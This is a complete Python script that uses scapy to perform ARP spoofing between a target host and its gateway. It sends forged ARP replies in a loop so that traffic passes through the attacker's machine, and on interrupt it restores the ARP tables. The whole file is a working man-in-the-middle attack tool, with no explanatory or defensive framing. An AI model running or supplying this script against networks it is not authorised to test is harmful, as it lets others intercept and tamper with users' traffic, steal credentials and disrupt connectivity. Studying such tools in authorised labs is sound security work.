#!/usr/bin/env python
import scapy.all as scapy
import time
import argparse
import sys

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Enter the Target's IP address", metavar="TARGET IP")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Enter the Gateway's IP address", metavar="GATEWAY IP")
    args = parser.parse_args()
    if not args.target_ip:
        parser.error("Enter valid IP address, use --help for more info!")
        return
    if not args.gateway_ip:
        parser.error("Enter valid IP address, use --help for more info!")
        return
    else:
        return args

def get_mac(ip):
    packet = scapy.ARP(pdst=ip)
    frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request = frame/packet
    answer_list = scapy.srp(arp_request, timeout=1, verbose=False)[0]
    mac = answer_list[0][1].hwsrc
    return mac

def arp_spoof(ip, spoof_ip, mac):
    packet = scapy.ARP(pdst=ip, hwdst=mac, psrc=spoof_ip, op=2)
    scapy.send(packet, verbose=False)

def restore_tables(ip, spoof_ip):
    packet = scapy.ARP(pdst=ip, hwdst=get_mac(ip), psrc=spoof_ip, hwsrc=get_mac(spoof_ip), op=2)
    packet2 = scapy.ARP(pdst=spoof_ip, hwdst=get_mac(spoof_ip), psrc=ip, hwsrc=get_mac(ip), op=2)
    scapy.send(packet, verbose=False, count=4)
    scapy.send(packet2, verbose=False, count=4)


try:
    args = get_arguments()
    count = 0
    mac_target = get_mac(args.target_ip)
    mac_gateway = get_mac(args.gateway_ip)
    while True:
        arp_spoof(args.target_ip, args.gateway_ip, mac_target)
        arp_spoof(args.gateway_ip, args.target_ip, mac_gateway)
        count += 2
        print("\r[+] Packets sent: " + str(count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore_tables(args.target_ip, args.gateway_ip)
    print("\n[!] Restoring Tables And Quitting The Program...")



